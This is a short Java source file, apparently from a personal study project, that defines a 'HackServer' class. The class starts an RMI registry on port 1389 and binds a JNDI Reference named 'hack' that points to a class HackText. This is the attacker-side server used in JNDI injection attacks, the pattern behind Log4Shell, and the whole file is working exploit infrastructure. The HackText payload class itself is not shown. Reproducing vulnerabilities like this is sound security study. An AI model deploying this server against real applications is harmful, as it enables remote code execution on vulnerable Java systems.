package com.fentiaozi.bug;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @description
 * @author: fentiaozi
 * @date 2022/6/2
 */
public class HackServer {
    public static void main(String[] args) throws RemoteException, AlreadyBoundException, NamingException {
        Registry registry = LocateRegistry.createRegistry(1389);
        Reference reference = new Reference("com.fentiaozi.bug.HackText","com.fentiaozi.bug.HackText",null);
        ReferenceWrapper wrapper = new ReferenceWrapper(reference);
        registry.bind("hack",wrapper);
        System.out.println("RegistryServer start...");

    }
}
